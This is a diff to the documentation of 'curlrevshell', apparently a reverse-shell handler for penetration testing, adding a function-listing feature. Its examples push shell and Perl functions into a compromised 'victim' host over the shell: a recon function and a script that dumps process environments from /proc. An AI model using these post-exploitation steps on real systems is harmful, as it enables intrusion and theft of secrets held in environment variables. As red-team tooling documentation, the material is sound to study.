@@ -61,7 +61,17 @@ so no need to restart curlrevshell if you change it.
 Files ending in `.pl` will be turned into shell function which call perl under
 the hood.  Stdio and argv and so on (should) work more or less like normal.
 
-Files ending in `.sh`, `.subr`, or with no `.`anything are sent as-is.
+Files ending in `.sh` and `.subr` are sent as-is.
+
+Everything else is ignored.  Makes it easy to stick a Makefile in there just in
+case you want to do something like embed a Java `.class` in a shell script.  Or
+something.
+
+Lines which start with `# TABDOC:` are used to generate a table of functions,
+printed by the aptly-named `tab_list` function.  In practice, this means
+sticking something like `# TABDOC: my_thing A thing, that is mine` above your
+functions and calling `tab_list` when you're ten functions in and don't
+remember which is which.
 
 For testing, `Ctrl+J` will print out what would be sent with `Ctrl+I`.
 
@@ -72,15 +82,16 @@ in memory over the network.
 Send a shell function library from `./sneaky.subr`.
 ```
 # Make the library
-echo 'recon() { id; uname -a; ps awwwfux; }; echo Loaded.' > ./sneaky.subr
+echo '# TABDOC: recon Figure out what this box is doing' > ./sneaky.subr
+echo 'recon() { id; uname -a; ps awwwfux; }; echo Loaded.' >> ./sneaky.subr
 # Set it as the file to be sent
 curlrevshell -ctrl-i ./sneaky.subr
 ...output...
 22:28:02.425 [192.168.178.23] Shell is ready to go!
 # Hit Ctrl+I here
 22:28:03.453 Inserting ./sneaky.subr...
-22:28:03.453 Inserted 52 bytes from ./sneaky.subr
-22:28:03.453 SHA256: baa747688afa72cbf9ded8f9ce43f44726aed9d38ccc707d165fb52508d4e86f
+22:28:03.453 Inserted 225 bytes from ./sneaky.subr
+22:28:03.453 SHA256: 3fda51a2d748949871ed3b8869600bfc176bec400b9126d70d50e6ef2411b4a6
 Loaded.
 > recon
 uid=1000(victim) gid=1000(victim) groups=1000(victim), 0(wheel), 117(dialer)
@@ -88,19 +99,23 @@ OpenBSD target.example.com 7.5 GENERIC.MP#82 amd64
 USER       PID %CPU %MEM   VSZ   RSS TT  STAT   STARTED       TIME COMMAND
 root         1  0.0  0.0   916   408 ??  I      10May24    0:00.12 /sbin/init
 ...more process listing...
+> tab_list
+recon     - Figure out what this box is doing
+tab_list  - This function list
 ```
 
 Send a whole directory of functions
 ```
 # Make the directory and functions
 mkdir ./funcs
-echo 'recon() { id; uname -a; ps awwwfux; }; echo Loaded.' > ./funcs/recon.subr
+echo '# TABDOC: recon Figure out what this box is doing' > ./funcs/recon.subr
+echo 'recon() { id; uname -a; ps awwwfux; }; echo Loaded.' >> ./funcs/recon.subr
 cat >./funcs/penv.pl <<'_eof'
-        #!/usr/bin/env perl
-        # Print a process's environment, nicely
-        open H, "</proc/".($ARGV[0]//"self")."/environ" or die "open: $!";
-        $/=$\;
-        print join("\n",sort(split/\0/,<H>))."\n";
+#!/usr/bin/env perl
+# TABDOC: penv Print a process's environment, nicely
+open H, "</proc/".($ARGV[0]//"self")."/environ" or die "open: $!";
+$/=$\;
+print join("\n",sort(split/\0/,<H>))."\n";
 _eof
 # Set that directory to be sent.
 curlrevshell -ctrl-i ./funcs
@@ -108,8 +123,8 @@ curlrevshell -ctrl-i ./funcs
 22:28:02.425 [192.168.178.23] Shell is ready to go!
 # Hit Ctrl+I here
 22:28:03.453 Inserting ./funcs...
-22:28:03.453 Inserted 438 bytes from ./funcs
-22:28:03.453 SHA256: 57b959f91e3646c29f420df5c563a70e864af66382048a238ce9d80db6b36d00
+22:28:03.453 Inserted 706 bytes from ./funcs
+22:28:03.453 SHA256: 82aed18b629ed87538b6ebfaed329f8696a305223f163c6d46e681c9c13ae8f1
 Loaded.
 > recon
 uid=1000(victim) gid=1000(victim) groups=1000(victim)
@@ -122,6 +137,10 @@ HOME=/home/victim
 LANG=C.UTF-8
 LOGNAME=victim
 ...more environment variables...
+> tab_list
+penv      - Print a process's environment, nicely
+recon     - Figure out what this box is doing
+tab_list  - This function list
 ```
 
 `-icanhazip`
